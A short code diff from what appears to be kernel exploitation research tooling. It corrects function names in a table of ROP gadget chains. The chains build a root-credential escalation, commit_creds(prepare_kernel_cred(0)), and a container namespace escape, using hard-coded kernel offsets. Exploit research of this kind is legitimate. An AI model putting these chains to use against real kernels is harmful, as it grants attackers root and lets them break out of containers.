@@ -20,17 +20,15 @@ rop_actions = {
             RopChainArgument(argument_index=0),
             RopChainOffset(kernel_offset=0x227a50, description="msleep()")]),
 
-        # commit_kernel_cred(prepare_kernel_cred(0))
         RopAction(
-          description="commit_kernel_cred(prepare_kernel_cred(0))",
+          description="commit_creds(prepare_kernel_cred(0))",
           gadgets=[
             RopChainOffset(kernel_offset=0x21f5, description="pop rdi"),
             RopChainConstant(value=0),
             RopChainOffset(kernel_offset=0x1be800, description="prepare_kernel_cred()"),
             RopChainOffset(kernel_offset=0x17caa80, description="mov rax, rdi"),
-            RopChainOffset(kernel_offset=0x1be550, description="commit_kernel_cred()")]),
+            RopChainOffset(kernel_offset=0x1be550, description="commit_creds()")]),
 
-        # switch_task_namespaces(find_task_by_vpid(ARG_vpid), init_nsproxy)
         RopAction(
           description="switch_task_namespaces(find_task_by_vpid(ARG_vpid), init_nsproxy)",
           gadgets=[
